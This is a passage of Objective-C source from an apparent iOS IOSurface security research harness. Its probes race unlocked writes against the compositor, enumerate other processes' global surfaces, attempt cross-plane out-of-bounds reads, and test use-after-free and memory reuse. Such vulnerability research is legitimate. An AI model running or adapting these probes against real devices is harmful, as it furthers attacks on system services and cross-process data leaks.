            done(res);
        }
    });
}

// =============================================================================
// ROUND 11: System service TOCTOU attacks
// =============================================================================

// Probe 34: Compositor TOCTOU — race against backboardd render server
// CALayer.contents = IOSurface forces the render server to map+read our surface.
// We write while it reads, creating a cross-process TOCTOU.
void iosurface_research_compositor_race(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                done(@{@"status": @"ERROR", @"reason": @"dlsym failed"});
                return;
            }

            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            __block uint32_t anomalies = 0;

            // Create an IOSurface suitable for display (BGRA 256x256)
            NSDictionary *dispProps = @{
                @"IOSurfaceWidth": @256, @"IOSurfaceHeight": @256,
                @"IOSurfacePixelFormat": @(0x42475241), // BGRA
                @"IOSurfaceBytesPerElement": @4,
                @"IOSurfaceBytesPerRow": @1024,
                @"IOSurfaceAllocSize": @(1024 * 256)
            };

            IOSurfaceRef dispSurf = sym.create((__bridge CFDictionaryRef)dispProps);
            if (!dispSurf) {
                log(@"COMPRACE: Create failed");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"reason": @"create failed"});
                return;
            }

            IOSurfaceID surfID = sym.getID(dispSurf);
            log([NSString stringWithFormat:@"COMPRACE: Display surface ID=%u, 256x256 BGRA", surfID]);

            // Fill with solid red initially
            sym.lock(dispSurf, 0, NULL);
            uint32_t *base = (uint32_t *)sym.getBase(dispSurf);
            if (base) {
                for (int i = 0; i < 256*256; i++) base[i] = 0xFFFF0000; // Red
            }
            sym.unlock(dispSurf, 0, NULL);

            // === Phase A: Attach to CALayer on main thread, force compositor to read ===
            log(@"COMPRACE: Phase A — attaching IOSurface to CALayer (triggers backboardd map)");

            __block BOOL compositorAccessed = NO;
            __block uint64_t lockContentionCount = 0;

            dispatch_sync(dispatch_get_main_queue(), ^{
                // Create an offscreen layer backed by our IOSurface
                CALayer *layer = [CALayer layer];
                layer.frame = CGRectMake(0, 0, 256, 256);
                layer.contents = (__bridge id)dispSurf;
                layer.opaque = YES;

                // Add to key window to force the render server to composite it
                UIWindow *window = nil;
                for (UIScene *scene in UIApplication.sharedApplication.connectedScenes) {
                    if ([scene isKindOfClass:[UIWindowScene class]]) {
                        UIWindowScene *ws = (UIWindowScene *)scene;
                        window = ws.windows.firstObject;
                        break;
                    }
                }
                if (window) {
                    [window.layer addSublayer:layer];
                    [CATransaction flush]; // Force immediate commit to render server
                    compositorAccessed = YES;
                    log(@"COMPRACE: Layer added to window — render server now reads our surface");
                } else {
                    log(@"COMPRACE: No window found — using offscreen rendering");
                    // Force a render anyway
                    [layer renderInContext:UIGraphicsGetCurrentContext() ?: ({
                        UIGraphicsBeginImageContext(CGSizeMake(256, 256));
                        UIGraphicsGetCurrentContext();
                    })];
                    UIGraphicsEndImageContext();
                }
            });

            if (isr_stopped()) { CFRelease(dispSurf); goto comprace_done; }

            // === Phase B: Race — write while compositor reads ===
            log(@"COMPRACE: Phase B — racing writes against compositor reads");
            {
                __block volatile int32_t writerRunning = 1;
                __block uint32_t framesRaced = 0;
                __block uint32_t lockConflicts = 0;

                // Writer thread: flip between patterns WITHOUT lock
                dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
                    uint32_t iter = 0;
                    while (writerRunning && !isr_stopped()) {
                        // NO LOCK — intentional race against compositor
                        uint32_t *wb = (uint32_t *)sym.getBase(dispSurf);
                        if (wb) {
                            uint32_t color = (iter % 2 == 0) ? 0xFF00FF00 : 0xFF0000FF; // green/blue
                            // Write pixel by pixel (maximizes torn-frame window)
                            for (int i = 0; i < 256*256; i++) {
                                wb[i] = color;
                            }
                            iter++;
                        }
                    }
                    OSAtomicIncrement32((volatile int32_t *)&framesRaced);
                });

                // Force compositor re-reads by flushing transactions
                for (int frame = 0; frame < 120 && !isr_stopped(); frame++) {
                    dispatch_sync(dispatch_get_main_queue(), ^{
                        [CATransaction begin];
                        [CATransaction flush];
                        [CATransaction commit];
                    });

                    // Check for lock contention — try locking during compositor read
                    kern_return_t kr = (kern_return_t)sym.lock(dispSurf, 0, NULL);
                    // If lock returns immediately, no contention
                    // Measure time to see if compositor holds it
                    uint64_t t1 = mach_absolute_time();
                    sym.unlock(dispSurf, 0, NULL);
                    uint64_t t2 = mach_absolute_time();
                    if ((t2 - t1) > 1000) { // > ~1us suggests contention
                        lockConflicts++;
                    }
                    framesRaced++;
                }

                writerRunning = 0;
                usleep(10000); // Let writer finish

                log([NSString stringWithFormat:@"COMPRACE: Frames raced = %u, lock conflicts = %u", framesRaced, lockConflicts]);
                if (lockConflicts > 0) {
                    anomalies++;
                    log([NSString stringWithFormat:@"COMPRACE: *** LOCK CONTENTION — compositor/render server was accessing our surface! %u conflicts ***", lockConflicts]);
                }
                if (framesRaced > 0 && compositorAccessed) {
                    anomalies++;
                    log(@"COMPRACE: *** TOCTOU WINDOW — wrote unlocked data while compositor was reading ***");
                }
            }

            if (isr_stopped()) { CFRelease(dispSurf); goto comprace_done; }

            // === Phase C: Timing side channel — measure compositor access pattern ===
            log(@"COMPRACE: Phase C — timing side channel on surface access");
            {
                uint64_t timings[60];
                for (int i = 0; i < 60 && !isr_stopped(); i++) {
                    uint64_t t1 = mach_absolute_time();
                    sym.lock(dispSurf, 0, NULL);
                    sym.unlock(dispSurf, 0, NULL);
                    uint64_t t2 = mach_absolute_time();
                    timings[i] = t2 - t1;
                    usleep(16666); // ~60fps timing to align with compositor
                }

                // Analyze timing variance — high variance suggests compositor contention
                uint64_t sum = 0, min = UINT64_MAX, max = 0;
                for (int i = 0; i < 60; i++) {
                    sum += timings[i];
                    if (timings[i] < min) min = timings[i];
                    if (timings[i] > max) max = timings[i];
                }
                uint64_t avg = sum / 60;
                uint64_t variance = 0;
                for (int i = 0; i < 60; i++) {
                    int64_t diff = (int64_t)timings[i] - (int64_t)avg;
                    variance += (uint64_t)(diff * diff);
                }
                variance /= 60;
                double stddev = sqrt((double)variance);

                log([NSString stringWithFormat:@"COMPRACE: Lock timing — min=%llu max=%llu avg=%llu stddev=%.1f ticks",
                    min, max, avg, stddev]);

                if (max > avg * 10 && max > 5000) {
                    anomalies++;
                    log(@"COMPRACE: *** TIMING ANOMALY — spikes suggest compositor lock contention ***");
                }
            }

            // Clean up — remove layer from main thread
            dispatch_sync(dispatch_get_main_queue(), ^{
                UIWindow *window = nil;
                for (UIScene *scene in UIApplication.sharedApplication.connectedScenes) {
                    if ([scene isKindOfClass:[UIWindowScene class]]) {
                        UIWindowScene *ws = (UIWindowScene *)scene;
                        window = ws.windows.firstObject;
                        break;
                    }
                }
                if (window) {
                    for (CALayer *sub in [window.layer.sublayers copy]) {
                        if (sub.contents == (__bridge id)dispSurf) {
                            [sub removeFromSuperlayer];
                        }
                    }
                }
            });

            CFRelease(dispSurf);

        comprace_done:;
            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"COMPRACE: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);
            NSDictionary *res = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-CompositorRace-checkpoint.json", res);
            isr_unload(&sym);
            done(res);
        }
    });
}

// Probe 35: System Surface Sniff — detect if system daemons access global surfaces
void iosurface_research_system_sniff(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                done(@{@"status": @"ERROR", @"reason": @"dlsym failed"});
                return;
            }

            typedef mach_port_t (*CreatePortFn)(IOSurfaceRef);
            CreatePortFn createPort = (CreatePortFn)dlsym(sym.iosurface, "IOSurfaceCreateMachPort");
            typedef void (*SetValueFn)(IOSurfaceRef, CFStringRef, CFTypeRef);
            SetValueFn setValue = (SetValueFn)dlsym(sym.iosurface, "IOSurfaceSetValue");
            typedef CFTypeRef (*CopyValueFn)(IOSurfaceRef, CFStringRef);
            CopyValueFn copyValue = (CopyValueFn)dlsym(sym.iosurface, "IOSurfaceCopyValue");
            typedef void (*IncrementUseFn)(IOSurfaceRef);
            IncrementUseFn incUseCount = (IncrementUseFn)dlsym(sym.iosurface, "IOSurfaceIncrementUseCount");
            typedef void (*DecrementUseFn)(IOSurfaceRef);
            DecrementUseFn decUseCount = (DecrementUseFn)dlsym(sym.iosurface, "IOSurfaceDecrementUseCount");
            typedef int32_t (*GetUseCountFn)(IOSurfaceRef);
            GetUseCountFn getUseCount = (GetUseCountFn)dlsym(sym.iosurface, "IOSurfaceGetUseCount");
            typedef Boolean (*IsInUseFn)(IOSurfaceRef);
            IsInUseFn isInUse = (IsInUseFn)dlsym(sym.iosurface, "IOSurfaceIsInUse");

            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            __block uint32_t anomalies = 0;

            // === Test A: Create global surface and monitor use count ===
            log(@"SYSSNIFF: Test A — global surface use count monitoring");
            {
                NSDictionary *gProps = @{
                    @"IOSurfaceWidth": @256, @"IOSurfaceHeight": @256,
                    @"IOSurfacePixelFormat": @(0x42475241),
                    @"IOSurfaceBytesPerElement": @4,
                    @"IOSurfaceBytesPerRow": @1024,
                    @"IOSurfaceAllocSize": @(1024 * 256),
                    @"IOSurfaceIsGlobal": @YES
                };
                IOSurfaceRef gSurf = sym.create((__bridge CFDictionaryRef)gProps);
                if (gSurf) {
                    IOSurfaceID gID = sym.getID(gSurf);
                    int32_t uc0 = getUseCount ? getUseCount(gSurf) : -1;
                    Boolean inUse0 = isInUse ? isInUse(gSurf) : false;
                    log([NSString stringWithFormat:@"SYSSNIFF: Global surface ID=%u useCount=%d inUse=%d", gID, uc0, inUse0]);

                    // Attach to CALayer to expose to compositor
                    dispatch_sync(dispatch_get_main_queue(), ^{
                        UIWindow *window = nil;
                        for (UIScene *scene in UIApplication.sharedApplication.connectedScenes) {
                            if ([scene isKindOfClass:[UIWindowScene class]]) {
                                window = ((UIWindowScene *)scene).windows.firstObject;
                                break;
                            }
                        }
                        if (window) {
                            CALayer *layer = [CALayer layer];
                            layer.frame = CGRectMake(0, 0, 1, 1); // Tiny but forces compositor
                            layer.contents = (__bridge id)gSurf;
                            [window.layer addSublayer:layer];
                            [CATransaction flush];
                        }
                    });

                    usleep(100000); // 100ms for compositor to pick it up

                    int32_t uc1 = getUseCount ? getUseCount(gSurf) : -1;
                    Boolean inUse1 = isInUse ? isInUse(gSurf) : false;
                    log([NSString stringWithFormat:@"SYSSNIFF: After compositor attach — useCount=%d inUse=%d", uc1, inUse1]);

                    if (uc1 > uc0) {
                        anomalies++;
                        log([NSString stringWithFormat:@"SYSSNIFF: *** USE COUNT INCREASED — system service accessed our surface! %d -> %d ***", uc0, uc1]);
                    }
                    if (inUse1 && !inUse0) {
                        anomalies++;
                        log(@"SYSSNIFF: *** IN-USE flag set by system — external process is using our surface ***");
                    }

                    // Write canary data and check if anything modifies it
                    sym.lock(gSurf, 0, NULL);
                    uint32_t *gBase = (uint32_t *)sym.getBase(gSurf);
                    if (gBase) {
                        for (int i = 0; i < 256*256; i++) gBase[i] = 0xCAFEBABE;
                    }
                    sym.unlock(gSurf, 0, NULL);

                    usleep(200000); // 200ms — let system process frames

                    sym.lock(gSurf, 0, NULL);
                    if (gBase) {
                        uint32_t modified = 0;
                        for (int i = 0; i < 256*256; i++) {
                            if (gBase[i] != 0xCAFEBABE) modified++;
                        }
                        if (modified > 0) {
                            anomalies++;
                            log([NSString stringWithFormat:@"SYSSNIFF: *** CRITICAL — %u pixels modified by system service! ***", modified]);
                        } else {
                            log(@"SYSSNIFF: Canary data intact — system reads but doesn't write");
                        }
                    }
                    sym.unlock(gSurf, 0, NULL);

                    // Set custom property — check if system reads it
                    if (setValue && copyValue) {
                        setValue(gSurf, CFSTR("com.research.probe"), (__bridge CFTypeRef)@"canary_value");
                        CFTypeRef val = copyValue(gSurf, CFSTR("com.research.probe"));
                        if (val) {
                            log([NSString stringWithFormat:@"SYSSNIFF: Custom property survives: %@", val]);
                            CFRelease(val);
                        }
                    }

                    // Clean up layer
                    dispatch_sync(dispatch_get_main_queue(), ^{
                        UIWindow *window = nil;
                        for (UIScene *scene in UIApplication.sharedApplication.connectedScenes) {
                            if ([scene isKindOfClass:[UIWindowScene class]]) {
                                window = ((UIWindowScene *)scene).windows.firstObject;
                                break;
                            }
                        }
                        if (window) {
                            for (CALayer *sub in [window.layer.sublayers copy]) {
                                if (sub.contents == (__bridge id)gSurf) {
                                    [sub removeFromSuperlayer];
                                }
                            }
                        }
                    });

                    int32_t uc2 = getUseCount ? getUseCount(gSurf) : -1;
                    log([NSString stringWithFormat:@"SYSSNIFF: After layer remove — useCount=%d", uc2]);
                    if (uc2 < uc1 && uc1 > uc0) {
                        log(@"SYSSNIFF: Use count dropped — confirms compositor was the user");
                    }

                    CFRelease(gSurf);
                }
            }

            if (isr_stopped()) goto syssniff_done;

            // === Test B: Mach port to bootstrap services ===
            log(@"SYSSNIFF: Test B — bootstrap service enumeration for IOSurface consumers");
            {
                const char *services[] = {
                    "com.apple.backboardd",
                    "com.apple.CoreAnimation.render-server",
                    "com.apple.windowserver",
                    "com.apple.gpumemd",
                    "com.apple.iokit.IOSurfaceRoot",
                    "com.apple.mediaserverd",
                };
                int nServices = sizeof(services) / sizeof(services[0]);

                for (int s = 0; s < nServices && !isr_stopped(); s++) {
                    mach_port_t svcPort = MACH_PORT_NULL;
                    kern_return_t kr = bootstrap_look_up(bootstrap_port,
                        (char *)services[s], &svcPort);
                    if (kr == KERN_SUCCESS && svcPort != MACH_PORT_NULL) {
                        anomalies++;
                        log([NSString stringWithFormat:@"SYSSNIFF: *** SERVICE REACHABLE — %s (port=0x%X) ***",
                            services[s], svcPort]);
                        mach_port_deallocate(mach_task_self(), svcPort);
                    } else {
                        log([NSString stringWithFormat:@"SYSSNIFF: %s — not reachable (kr=%d)", services[s], kr]);
                    }
                }
            }

            if (isr_stopped()) goto syssniff_done;

            // === Test C: Global surface ID enumeration — find system surfaces ===
            log(@"SYSSNIFF: Test C — enumerate existing global surface IDs");
            {
                uint32_t sysIDs = 0;
                IOSurfaceRef probe = NULL;
                for (IOSurfaceID testID = 1; testID <= 100 && !isr_stopped(); testID++) {
                    probe = sym.lookup(testID);
                    if (probe) {
                        size_t w = sym.getWidth(probe);
                        size_t h = sym.getHeight(probe);
                        size_t alloc = sym.getAllocSize(probe);
                        sysIDs++;
                        log([NSString stringWithFormat:@"SYSSNIFF: Found surface ID=%u — %zux%zu alloc=%zu (system-owned?)",
                            testID, w, h, alloc]);
                        CFRelease(probe);
                    }
                }
                if (sysIDs > 0) {
                    anomalies++;
                    log([NSString stringWithFormat:@"SYSSNIFF: *** FOUND %u accessible surfaces via ID lookup ***", sysIDs]);
                    log(@"SYSSNIFF: These may belong to system services — readable/writable without auth");
                }
            }

        syssniff_done:;
            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"SYSSNIFF: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);
            NSDictionary *res = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-SystemSniff-checkpoint.json", res);
            isr_unload(&sym);
            done(res);
        }
    });
}

// Probe 36: Render Server Corruption — force backboardd to process corrupted surface data
void iosurface_research_render_corrupt(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) {
                done(@{@"status": @"ERROR", @"reason": @"dlsym failed"});
                return;
            }

            typedef void *(*GetPlaneBaseFn)(IOSurfaceRef, size_t);
            GetPlaneBaseFn getPlaneBase = (GetPlaneBaseFn)dlsym(sym.iosurface, "IOSurfaceGetBaseAddressOfPlane");

            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            __block uint32_t anomalies = 0;

            // === Test A: Dual-plane surface as CALayer contents ===
            // The render server reads plane0. If it doesn't validate plane boundaries,
            // our CG overflow primitive works cross-process.
            log(@"RENDCORR: Test A — dual-plane surface as compositor input");

            NSDictionary *p0Info = @{
                @"IOSurfacePlaneWidth": @128, @"IOSurfacePlaneHeight": @128,
                @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @0,
                @"IOSurfacePlaneBytesPerRow": @512
            };
            NSDictionary *p1Info = @{
                @"IOSurfacePlaneWidth": @128, @"IOSurfacePlaneHeight": @128,
                @"IOSurfacePlaneBytesPerElement": @4, @"IOSurfacePlaneOffset": @(512*128),
                @"IOSurfacePlaneBytesPerRow": @512
            };
            NSDictionary *dualDisp = @{
                @"IOSurfaceWidth": @128, @"IOSurfaceHeight": @128,
                @"IOSurfacePixelFormat": @(0x42475241),
                @"IOSurfaceBytesPerElement": @4,
                @"IOSurfaceBytesPerRow": @512,
                @"IOSurfaceAllocSize": @(512 * 256), // 128 rows * 2 planes
                @"IOSurfacePlaneInfo": @[p0Info, p1Info]
            };

            IOSurfaceRef dSurf = sym.create((__bridge CFDictionaryRef)dualDisp);
            if (!dSurf) {
                log(@"RENDCORR: Create failed");
                isr_unload(&sym);
                done(@{@"status": @"ERROR", @"reason": @"create failed"});
                return;
            }

            // Write secret data to plane1
            sym.lock(dSurf, 0, NULL);
            void *dp0 = getPlaneBase ? getPlaneBase(dSurf, 0) : NULL;
            void *dp1 = getPlaneBase ? getPlaneBase(dSurf, 1) : NULL;
            if (dp0 && dp1) {
                uint32_t *px0 = (uint32_t *)dp0;
                uint32_t *px1 = (uint32_t *)dp1;
                for (int i = 0; i < 128*128; i++) px0[i] = 0xFF0000FF; // Blue visible
                for (int i = 0; i < 128*128; i++) px1[i] = 0xDEADBEEF; // secret in plane1
            }
            sym.unlock(dSurf, 0, NULL);

            // Tell compositor this surface is 256 rows high by using it as a 256-high layer
            __block BOOL layerAdded = NO;
            dispatch_sync(dispatch_get_main_queue(), ^{
                UIWindow *window = nil;
                for (UIScene *scene in UIApplication.sharedApplication.connectedScenes) {
                    if ([scene isKindOfClass:[UIWindowScene class]]) {
                        window = ((UIWindowScene *)scene).windows.firstObject;
                        break;
                    }
                }
                if (window) {
                    CALayer *layer = [CALayer layer];
                    layer.frame = CGRectMake(0, 0, 128, 256); // 256 high — covers both planes
                    layer.contents = (__bridge id)dSurf;
                    layer.contentsRect = CGRectMake(0, 0, 1, 1);
                    [window.layer addSublayer:layer];
                    [CATransaction flush];
                    layerAdded = YES;
                    log(@"RENDCORR: Dual-plane surface attached as 128x256 layer");
                }
            });

            if (layerAdded) {
                anomalies++;
                log(@"RENDCORR: *** Compositor accepted dual-plane surface — may read beyond plane0 ***");

                // Race: modify plane1 while compositor renders
                for (int round = 0; round < 30 && !isr_stopped(); round++) {
                    uint32_t *px1 = dp1 ? (uint32_t *)dp1 : NULL;
                    if (px1) {
                        uint32_t pattern = 0xFF000000 | (uint32_t)(round * 8);
                        for (int i = 0; i < 128*128; i++) px1[i] = pattern;
                    }
                    dispatch_sync(dispatch_get_main_queue(), ^{
                        [CATransaction flush];
                    });
                    usleep(16666); // 60fps
                }
                log(@"RENDCORR: 30 frames of plane1 modification during compositing complete");
            }

            if (!isr_stopped()) {
            // === Test B: Snapshot the composited result to detect cross-plane leak ===
            log(@"RENDCORR: Test B — snapshot composited output");
            dispatch_sync(dispatch_get_main_queue(), ^{
                UIWindow *window = nil;
                for (UIScene *scene in UIApplication.sharedApplication.connectedScenes) {
                    if ([scene isKindOfClass:[UIWindowScene class]]) {
                        window = ((UIWindowScene *)scene).windows.firstObject;
                        break;
                    }
                }
                if (window) {
                    UIGraphicsBeginImageContextWithOptions(window.bounds.size, YES, 1.0);
                    [window drawViewHierarchyInRect:window.bounds afterScreenUpdates:YES];
                    UIImage *snapshot = UIGraphicsGetImageFromCurrentImageContext();
                    UIGraphicsEndImageContext();

                    if (snapshot) {
                        CGImageRef cgImg = snapshot.CGImage;
                        size_t sw = CGImageGetWidth(cgImg);
                        size_t sh = CGImageGetHeight(cgImg);
                        log([NSString stringWithFormat:@"RENDCORR: Snapshot = %zux%zu", sw, sh]);

                        CFDataRef pixData = CGDataProviderCopyData(CGImageGetDataProvider(cgImg));
                        if (pixData) {
                            const uint32_t *spx = (const uint32_t *)CFDataGetBytePtr(pixData);
                            size_t npx = (size_t)CFDataGetLength(pixData) / 4;
                            // Look for our plane1 patterns in the rendered output
                            uint32_t secretFound = 0;
                            for (size_t i = 0; i < npx && i < 100000; i++) {
                                uint32_t v = spx[i];
                                // Check for our plane1 patterns
                                if (v == 0xDEADBEEF || (v & 0xFF000000) == 0xFF000000) {
                                    // Could be our data — check if it's not just black/standard color
                                    uint8_t r = (v >> 16) & 0xFF;
                                    uint8_t g = (v >> 8) & 0xFF;
                                    if (r == 0 && g > 0 && g < 240 && (g % 8) == 0) {
                                        secretFound++;
                                    }
                                }
                            }
                            if (secretFound > 10) {
                                anomalies++;
                                log([NSString stringWithFormat:@"RENDCORR: *** CRITICAL — %u plane1 pixels visible in composited output ***", secretFound]);
                            } else {
                                log([NSString stringWithFormat:@"RENDCORR: Plane1 pattern matches in snapshot = %u (may be coincidental)", secretFound]);
                            }
                            CFRelease(pixData);
                        }
                    }

                    // Clean up layers
                    for (CALayer *sub in [window.layer.sublayers copy]) {
                        if (sub.contents == (__bridge id)dSurf) {
                            [sub removeFromSuperlayer];
                        }
                    }
                }
            });
            } // end if (!isr_stopped())

            CFRelease(dSurf);

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"RENDCORR: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);
            NSDictionary *res = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-RenderCorrupt-checkpoint.json", res);
            isr_unload(&sym);
            done(res);
        }
    });
}

// =============================================================================
// ROUND 12: Aggressive exploitation chains
// =============================================================================

// Probe 37: UAF Compositor — release surface while compositor still references it
void iosurface_research_compositor_uaf(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
    atomic_store(&g_isr_stop, false);
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            ISRSymbols sym;
            if (!isr_load(&sym)) { done(@{@"status": @"ERROR", @"reason": @"dlsym failed"}); return; }

            typedef mach_port_t (*CreatePortFn)(IOSurfaceRef);
            CreatePortFn createPort = (CreatePortFn)dlsym(sym.iosurface, "IOSurfaceCreateMachPort");
            typedef IOSurfaceRef (*LookupPortFn)(mach_port_t);
            LookupPortFn lookupPort = (LookupPortFn)dlsym(sym.iosurface, "IOSurfaceLookupFromMachPort");
            typedef int32_t (*GetUseCountFn)(IOSurfaceRef);
            GetUseCountFn getUseCount = (GetUseCountFn)dlsym(sym.iosurface, "IOSurfaceGetUseCount");
            typedef Boolean (*IsInUseFn)(IOSurfaceRef);
            IsInUseFn isInUse = (IsInUseFn)dlsym(sym.iosurface, "IOSurfaceIsInUse");

            CFAbsoluteTime start = CFAbsoluteTimeGetCurrent();
            __block uint32_t anomalies = 0;

            // === Test A: Attach surface to compositor, then release original ref ===
            log(@"COMPUAF: Test A — release surface while compositor holds a reference");

            NSDictionary *props = @{
                @"IOSurfaceWidth": @128, @"IOSurfaceHeight": @128,
                @"IOSurfacePixelFormat": @(0x42475241),
                @"IOSurfaceBytesPerElement": @4,
                @"IOSurfaceBytesPerRow": @512,
                @"IOSurfaceAllocSize": @(512 * 128)
            };

            IOSurfaceRef surf = sym.create((__bridge CFDictionaryRef)props);
            if (!surf) { isr_unload(&sym); done(@{@"status": @"ERROR", @"reason": @"create failed"}); return; }

            IOSurfaceID origID = sym.getID(surf);

            // Write canary pattern
            sym.lock(surf, 0, NULL);
            uint32_t *base = (uint32_t *)sym.getBase(surf);
            if (base) {
                for (int i = 0; i < 128*128; i++) base[i] = 0xCAFE0000 | (uint32_t)(i & 0xFFFF);
            }
            sym.unlock(surf, 0, NULL);

            // Save mach port reference before attaching to compositor
            mach_port_t savedPort = MACH_PORT_NULL;
            if (createPort) savedPort = createPort(surf);

            int32_t uc0 = getUseCount ? getUseCount(surf) : -1;
            log([NSString stringWithFormat:@"COMPUAF: Surface ID=%u, useCount=%d before compositor", origID, uc0]);

            // Attach to compositor
            __block CALayer *uafLayer = nil;
            dispatch_sync(dispatch_get_main_queue(), ^{
                UIWindow *window = nil;
                for (UIScene *scene in UIApplication.sharedApplication.connectedScenes) {
                    if ([scene isKindOfClass:[UIWindowScene class]]) {
                        window = ((UIWindowScene *)scene).windows.firstObject;
                        break;
                    }
                }
                if (window) {
                    uafLayer = [CALayer layer];
                    uafLayer.frame = CGRectMake(-1, -1, 1, 1); // offscreen but compositor still maps it
                    uafLayer.contents = (__bridge id)surf;
                    [window.layer addSublayer:uafLayer];
                    [CATransaction flush];
                }
            });

            usleep(50000); // 50ms for compositor

            int32_t uc1 = getUseCount ? getUseCount(surf) : -1;
            log([NSString stringWithFormat:@"COMPUAF: useCount after compositor attach = %d", uc1]);

            // NOW: release our reference — compositor should still hold one
            log(@"COMPUAF: Releasing original CFRelease...");
            CFRelease(surf);
            surf = NULL;

            usleep(50000);

            // Try to recover via mach port — if the surface is still alive, we get it back
            IOSurfaceRef recovered = NULL;
            if (lookupPort && savedPort != MACH_PORT_NULL) {
                recovered = lookupPort(savedPort);
                if (recovered) {
                    IOSurfaceID recID = sym.getID(recovered);
                    int32_t ucRec = getUseCount ? getUseCount(recovered) : -1;
                    anomalies++;
                    log([NSString stringWithFormat:@"COMPUAF: *** RECOVERED via mach port! ID=%u useCount=%d ***", recID, ucRec]);

                    // Can we still read the canary data?
                    sym.lock(recovered, 0, NULL);
                    uint32_t *recBase = (uint32_t *)sym.getBase(recovered);
                    if (recBase) {
                        uint32_t canaryOK = 0;
                        for (int i = 0; i < 100; i++) {
                            if (recBase[i] == (0xCAFE0000 | (uint32_t)(i & 0xFFFF))) canaryOK++;
                        }
                        log([NSString stringWithFormat:@"COMPUAF: Canary data intact = %u/100", canaryOK]);
                        if (canaryOK > 90) {
                            anomalies++;
                            log(@"COMPUAF: *** CRITICAL — surface alive after CFRelease, data intact ***");
                        }
                    }
                    sym.unlock(recovered, 0, NULL);
                } else {
                    log(@"COMPUAF: Mach port lookup returned NULL — surface fully released");
                }
            }

            // Try to look up by original ID
            IOSurfaceRef idLookup = sym.lookup(origID);
            if (idLookup) {
                anomalies++;
                log([NSString stringWithFormat:@"COMPUAF: *** ID lookup still works after release! ID=%u ***", origID]);
                CFRelease(idLookup);
            } else {
                log(@"COMPUAF: ID lookup returned NULL — ID freed");
            }

            // === Test B: Rapid create-release-reuse with compositor ===
            log(@"COMPUAF: Test B — rapid create/release cycle with compositor attached");
            {
                uint32_t reuseHits = 0;
                for (int cycle = 0; cycle < 20 && !isr_stopped(); cycle++) {
                    IOSurfaceRef cSurf = sym.create((__bridge CFDictionaryRef)props);
                    if (!cSurf) continue;

                    IOSurfaceID cID = sym.getID(cSurf);

                    // Write unique pattern
                    sym.lock(cSurf, 0, NULL);
                    uint32_t *cb = (uint32_t *)sym.getBase(cSurf);
                    if (cb) {
                        for (int i = 0; i < 128*128; i++) cb[i] = 0xDEAD0000 | (uint32_t)cycle;
                    }
                    sym.unlock(cSurf, 0, NULL);

                    // Attach to layer
                    dispatch_sync(dispatch_get_main_queue(), ^{
                        if (uafLayer) uafLayer.contents = (__bridge id)cSurf;
                        [CATransaction flush];
                    });

                    // Release immediately
                    CFRelease(cSurf);

                    // Create new surface — might reuse the backing memory
                    IOSurfaceRef nSurf = sym.create((__bridge CFDictionaryRef)props);
                    if (nSurf) {
                        sym.lock(nSurf, 0, NULL);
                        uint32_t *nb = (uint32_t *)sym.getBase(nSurf);
                        if (nb) {
                            // Check for residual data from the previous surface
                            uint32_t residual = 0;
                            for (int i = 0; i < 100; i++) {
                                if (nb[i] == (0xDEAD0000 | (uint32_t)cycle)) residual++;
                            }
                            if (residual > 50) {
                                reuseHits++;
                            }
                        }
                        sym.unlock(nSurf, 0, NULL);
                        CFRelease(nSurf);
                    }
                }
                if (reuseHits > 0) {
                    anomalies++;
                    log([NSString stringWithFormat:@"COMPUAF: *** MEMORY REUSE — %u/20 cycles had residual data ***", reuseHits]);
                } else {
                    log(@"COMPUAF: No memory reuse detected (iOS 27 zeroes allocations)");
                }
            }

            // Clean up layer
            dispatch_sync(dispatch_get_main_queue(), ^{
                if (uafLayer) [uafLayer removeFromSuperlayer];
            });
            if (recovered) CFRelease(recovered);
            if (savedPort != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), savedPort);

            double elapsed = CFAbsoluteTimeGetCurrent() - start;
            log([NSString stringWithFormat:@"COMPUAF: DONE anomalies=%u elapsed=%.3fs", anomalies, elapsed]);
            NSDictionary *res = @{
                @"status": isr_stopped() ? @"STOPPED" : @"DONE",
                @"anomalies": @(anomalies),
                @"elapsed": @(elapsed)
            };
            isr_checkpoint(@"ISR-CompositorUAF-checkpoint.json", res);
            isr_unload(&sym);
            done(res);
        }
    });
}

// Probe 38: Kernel Metadata Harvest — extract all accessible IOSurface properties
void iosurface_research_kernel_harvest(ISRLogBlock _Nonnull log, ISRDoneBlock _Nonnull done) {
